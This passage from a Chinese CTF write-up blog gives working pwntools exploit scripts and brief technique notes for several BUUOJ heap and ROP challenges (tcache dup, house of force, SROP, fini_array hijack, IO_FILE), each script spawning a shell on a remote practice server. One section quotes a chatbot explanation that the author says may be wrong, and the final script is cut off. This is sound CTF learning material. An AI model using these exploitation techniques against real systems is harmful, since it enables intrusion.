<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">29112</span></span><br><span class="line">libc_name = <span class="string">&#x27;../libcs/libc-2.23_amd64.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">        sla(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">        menu(<span class="number">1</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;Input the length of the note content:(less than 128)&#x27;</span>,itob(size))</span><br><span class="line">        sla(<span class="string">b&#x27;Input the note content:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">        menu(<span class="number">2</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;Input the id of the note:&#x27;</span>,itob(index))</span><br><span class="line">        ru(<span class="string">b&#x27;Content is &#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvline(<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,choice,data</span>):</span><br><span class="line">        menu(<span class="number">3</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;Input the id of the note:&#x27;</span>,itob(index))</span><br><span class="line">        sla(<span class="string">b&#x27;do you want to overwrite or append?[1.overwrite/2.append]&#x27;</span>,itob(choice))</span><br><span class="line">        sl(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        menu(<span class="number">4</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;Input the id of the note:&#x27;</span>,itob(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">        ptr_0 = <span class="number">0x602120</span></span><br><span class="line">        sl(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">        sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x30</span>,<span class="string">b&#x27;/bin/sh;&#x27;</span>+p64(<span class="number">0x51</span>)+p64(ptr_0-<span class="number">0x18</span>)+p64(ptr_0-<span class="number">0x10</span>)) <span class="comment">#0</span></span><br><span class="line">        add(<span class="number">0x0</span>,<span class="string">b&#x27;ddd&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">        add(<span class="number">0x79</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x50</span>)+p64(<span class="number">0x90</span>)) <span class="comment">#3</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        edit(<span class="number">0</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(elf.sym[<span class="string">&#x27;got.free&#x27;</span>]))</span><br><span class="line">        free_libc = u64(dump(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">        libc.address = free_libc - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">        edit(<span class="number">0</span>,<span class="number">1</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])[:<span class="number">6</span>])</span><br><span class="line">        p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="comment">#p = process(filename)</span></span><br><span class="line">        p = remote(ip,port)</span><br><span class="line">        pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h2><p>绝对的屎 我patchelf半天没pat成功 然后下了个docker 发现发docker的那个人发了个修复的libc2.27 也是很无敌了</p>
<p>然后我就只能远程打了 </p>
<p>这题其实house of roman应该可以直接出来 但是这样题目有个gift没用到 。我们的问题是泄露libc很困难，很可能这个就是用来泄露libc的，如果我们能把unsortedbin 的fd指针塞到一个tcachebin里面 再分配出那个地址，就可以泄露libc </p>
<p>那么思路就有了 就是先通过tcachebin dup 污染一个size 使它free掉进入unsortedbin 然后通过上一个块切割的方式使得下一块的tcache的fd指针被覆盖。然后再分配到libc中 后面就很简单了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27604</span></span><br><span class="line">libc_name = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./ciscn_final_3&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">        sla(<span class="string">b&#x27;choice &gt;&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,data</span>):</span><br><span class="line">        menu(<span class="number">1</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;input the index&#x27;</span>,itob(index))</span><br><span class="line">        sla(<span class="string">b&#x27;input the size&#x27;</span>,itob(size))</span><br><span class="line">        sa(<span class="string">b&#x27;now you can write something&#x27;</span>,data)</span><br><span class="line">        ru(<span class="string">b&#x27;gift :&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">        menu(<span class="number">2</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;input the index&#x27;</span>,itob(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">        heap_leak=<span class="built_in">int</span>(add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>).decode(<span class="string">&#x27;l1&#x27;</span>),<span class="number">16</span>) <span class="comment">#0</span></span><br><span class="line">        heap_start = heap_leak-<span class="number">0x10</span></span><br><span class="line">        add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">12</span>):</span><br><span class="line">                <span class="built_in">print</span>(add(i,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">        add(<span class="number">12</span>,<span class="number">0x28</span>,<span class="string">b&#x27;d&#x27;</span>) <span class="comment">#12</span></span><br><span class="line">        remove(<span class="number">12</span>)</span><br><span class="line">        remove(<span class="number">12</span>)</span><br><span class="line">        add(<span class="number">13</span>,<span class="number">0x28</span>,p64(heap_start))</span><br><span class="line">        add(<span class="number">14</span>,<span class="number">0x28</span>,p64(heap_start))</span><br><span class="line">        add(<span class="number">15</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))</span><br><span class="line">        remove(<span class="number">0</span>)</span><br><span class="line">        remove(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">16</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">17</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>)</span><br><span class="line">        libc.address=<span class="built_in">int</span>(add(<span class="number">18</span>,<span class="number">0x18</span>,<span class="string">b&#x27;g&#x27;</span>).decode(<span class="string">&#x27;l1&#x27;</span>),<span class="number">16</span>)-<span class="number">0x3ebca0</span></span><br><span class="line">        free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">        system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        remove(<span class="number">5</span>)</span><br><span class="line">        remove(<span class="number">5</span>)</span><br><span class="line">        add(<span class="number">19</span>,<span class="number">0x78</span>,p64(free_hook))</span><br><span class="line">        add(<span class="number">20</span>,<span class="number">0x78</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        add(<span class="number">21</span>,<span class="number">0x78</span>,p64(system))</span><br><span class="line">        p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment">#       p=process(filename)</span></span><br><span class="line">        p = remote(ip,port)</span><br><span class="line">        pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a>ciscn_2019_sw_1</h2><p>这题利用到了fini.array</p>
<blockquote>
<p>x64静态编译程序，劫持fini_array</p>
<blockquote>
<p>array[0]覆盖为__libc_csu_fini</p>
<p>array[1]覆盖为另一地址addrA</p>
</blockquote>
<p>程序将循环执行addrA</p>
<p>终止条件为array[0]不再为__libc_csu_fini</p>
<p>相当于：<br>    while (array[0] &#x3D;&#x3D; __libc_csu_fini){<br>        addrA();<br>    }</p>
<p>比如addrA中存在任意写一字节内存漏洞，通过上面这个循环就可以实现任意写多字节</p>
</blockquote>
<p>上述引用<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/226003.html">详解64位静态编译程序的fini_array劫持及ROP攻击 - FreeBuf网络安全行业门户</a></p>
<p>但是这题只需要用到array[0] 因为我们只需要触发一次array[0] 回到main 就能getshell。</p>
<p>注意这个方法的基础是norelro ，我们也可以反过来推测 norelro时 很大概率要用到这个漏洞。</p>
<p>其他的就没啥好说的了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">28852</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/libc6-i386_2.27-3ubuntu1_amd64/lib32/libc-2.27.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./ciscn_2019_sw_1&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    printf_got = <span class="number">0x0804989C</span></span><br><span class="line">    system_plt= <span class="number">0x80483D0</span></span><br><span class="line">    fini = <span class="number">0x0804979C</span></span><br><span class="line">    main = <span class="number">0x08048534</span></span><br><span class="line">    payload = <span class="string">b&#x27;%2052c%16$hn%18$hn%31692c%17$hn%356c%15$hn&#x27;</span>+<span class="string">b&#x27;aa&#x27;</span> + p32(fini) + p32(fini+<span class="number">2</span>) + p32(printf_got) + p32(printf_got+<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload)) </span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#In [1]: 0x0804 Out[1]: 2052 In [2]: 0x08534 Out[2]: 34100</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><p>从标题来看就知道是house_of_force 。</p>
<p>但另外 这题还用到一个神奇的技术 。就是通过申请一个很大的堆块，这个堆块会在mmap区域分配，这个区域和libc连续，所以可以泄露libc地址。</p>
<p>首选分配大小0x1ffff0或者0x200000</p>
<p>deepseek是这么解释的 但我不保证正确性<br>实际的阈值</p>
<hr>
<p>实际上有两个重要的阈值：</p>
<ol>
<li><p>**<code>mmap_threshold</code>**（默认 128KB）：</p>
<ul>
<li><p>超过此值，<code>malloc</code> _可能_使用 mmap</p>
</li>
<li><p>但仍在堆区尝试首先分配</p>
</li>
</ul>
</li>
<li><p>**<code>DEFAULT_MMAP_THRESHOLD_MAX</code>**（默认 32MB 或 64MB）：</p>
<ul>
<li><p>当请求大小超过此值时，几乎总是会在 mmap 区域分配</p>
</li>
<li><p>这时才会出现在 libc 之前的低地址区。</p>
</li>
</ul>
</li>
</ol>
<p>house of force的过程就比较简单 ，但是只能在2.27之前使用这个技术，house_of_force就是覆盖topchunk大小 然后申请很大的堆块，分配到目标位置，这里我们分配到malloc_hook。 </p>
<p>会发现malloc_hook不能一次one_gadget   故尝试 malloc_hook realloc_hook 结果还是不行</p>
<p>这时候可以尝试一下realloc+0x10 因为realloc函数开始时是有开栈操作的 去掉这个操作再尝试一下可能会有效果。</p>
<p>网络上有些博客说是glibc版本问题，这显然不合理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">28109</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/libc6_2.23-0ubuntu11_amd64/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./gyctf_2020_force&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;2:puts&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line"><span class="comment"># overflow!</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&#x27;</span>,itob(size))</span><br><span class="line">    ru(<span class="string">b&#x27;bin addr &#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(p.recvline(),<span class="number">16</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;a&#x27;</span>) - (<span class="number">0x70f6a2fff010</span>-<span class="number">0x70f6a3200000</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    heap_leak = add(<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) )-<span class="number">0x10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    __malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    offset = __malloc_hook - heap_leak - <span class="number">0x20</span></span><br><span class="line">    malloc_size = offset - <span class="number">0x10</span> - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">    add(malloc_size,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> )</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    add(<span class="number">0x10</span>,p64(<span class="number">0x4526a</span> +libc_base)*<span class="number">2</span>+p64(libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">0x10</span>))<span class="comment">#p64(flibc.sym[&#x27;realloc&#x27;]+0x10) )</span></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h2><p>几乎是一个标准的srop的模型题，但这题配合上了一个栈迁移</p>
<p>SROP在ctf-wiki上的资料已经寄了，但是可以通过题解和ai来学习，这里我不打算多说。</p>
<p>概括来讲，srop就是基于sigreturn 的 rop 。 sigreturn是sig handler用到的一个独特的函数。handler是程序开发者自己设计的一个用于处理signal的特殊的程序,是在用户态运行的。在进入hanler时 内核首先会把进程上下文存储在用户栈中，退出handler时 则会运行sigreturn，然后再从用户栈中取出进程上下文，handler与进程的栈是共用的，这也是导致srop的一个原因。</p>
<p>这题基本上是标准的srop，我们需要运行&#x2F;bin&#x2F;sh,但是一次sigreturn  ，由于并不知道栈地址，不可行，所以第一次sigreturn需要跳转到syscall, leave,return 进行对data段写入 同时栈迁移，然后再sigreturn弹出 shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27053</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/libc6_2.23-0ubuntu11_amd64/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./rootersctf_2019_srop&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">pop_rax_sys = <span class="number">0x401032</span></span><br><span class="line">syscall = <span class="number">0x401033</span></span><br><span class="line"><span class="comment"># data</span></span><br><span class="line">buf = <span class="number">0x402000</span></span><br><span class="line"><span class="comment"># sigFrame</span></span><br><span class="line">sigFrame = SigreturnFrame()</span><br><span class="line">sigFrame.rax = <span class="number">0</span></span><br><span class="line">sigFrame.rdi = <span class="number">0</span></span><br><span class="line">sigFrame.rsi = buf</span><br><span class="line">sigFrame.rdx = <span class="number">0x100</span></span><br><span class="line">sigFrame.rbp = buf+<span class="number">0x20</span></span><br><span class="line">sigFrame.rsp = buf</span><br><span class="line">sigFrame.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(pop_rax_sys) +p64(<span class="number">15</span>)+<span class="built_in">bytes</span>(sigFrame)</span><br><span class="line">    sa(<span class="string">b&#x27;Hey, can i get some feedback for the CTF?&#x27;</span>, payload1)</span><br><span class="line">    sigFrame2 = SigreturnFrame()</span><br><span class="line">    sigFrame2.rax = <span class="number">59</span></span><br><span class="line">    sigFrame2.rdi = buf</span><br><span class="line">    sigFrame2.rsi = <span class="number">0</span></span><br><span class="line">    sigFrame2.rdx = <span class="number">0</span></span><br><span class="line">    sigFrame2.rbp = buf+<span class="number">0x20</span></span><br><span class="line">    sigFrame2.rsp = buf</span><br><span class="line">    sigFrame2.rip = syscall</span><br><span class="line">    payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span>-<span class="built_in">len</span>(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)) + p64(<span class="number">0</span>) + p64(pop_rax_sys) + p64(<span class="number">15</span>) + <span class="built_in">bytes</span>(sigFrame2)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    s(payload2)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#p = process(filename)</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="ciscn-final-2"><a href="#ciscn-final-2" class="headerlink" title="ciscn_final_2"></a>ciscn_final_2</h2><p>应该是我实操的第一个IOfile的题，之前有接触过 但是没有实际打过。不过这个IOfile比较基础，并没有比较复杂的覆盖部分，就是单纯的把 stdin 的文件描述符篡改成 flag 的文件描述符</p>
<p>IOfile的结构可以在gdb中看，但是比较吃风水 有时候看不到，不过可以网上搜，这里直接给出_fileno &#x3D; 0 的偏移是 0x70 </p>
<p>然后就是怎么利用，这题我们只能做到部分覆盖，打fastbindup是够的。问题是怎么泄露libc_base，程序开启了pie，无法知道got表位置，那么就考虑用unsortedbin  ，问题是我们无法控制malloc大小，因此fastbindup就是来伪造size的。 </p>
<p>有这个思路，后面就不是很困难了，就不细说了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25293</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./ciscn_final_2&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,num</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>,itob(index))</span><br><span class="line">    sla(<span class="string">b&#x27;your inode number:&#x27;</span>,itob(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, itob(index))</span><br><span class="line">    ru(<span class="string">b&#x27;inode number :&#x27;</span>)</span><br><span class="line">    leaked_value = <span class="built_in">int</span>(p.recvline(<span class="literal">False</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据类型修正返回值</span></span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">1</span>:  <span class="comment"># 如果是 int 类型（32 位）</span></span><br><span class="line">        leaked_value = leaked_value &amp; <span class="number">0xFFFFFFFF</span>  <span class="comment"># 转换为无符号 32 位数</span></span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">2</span>:  <span class="comment"># 如果是 short 类型（16 位）</span></span><br><span class="line">        leaked_value = leaked_value &amp; <span class="number">0xFFFF</span>  <span class="comment"># 转换为无符号 16 位数</span></span><br><span class="line">    <span class="keyword">return</span> leaked_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">666</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">666</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">666</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">666</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">666</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">666</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    heap_leak = show(<span class="number">2</span>)</span><br><span class="line">    heap_target = heap_leak - <span class="number">0x20</span>*<span class="number">3</span> - <span class="number">0x30</span> - <span class="number">0x10</span> </span><br><span class="line">    add(<span class="number">2</span>,heap_target)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment"># 为后续打fastbindup做准备</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x91</span>) <span class="comment"># fake 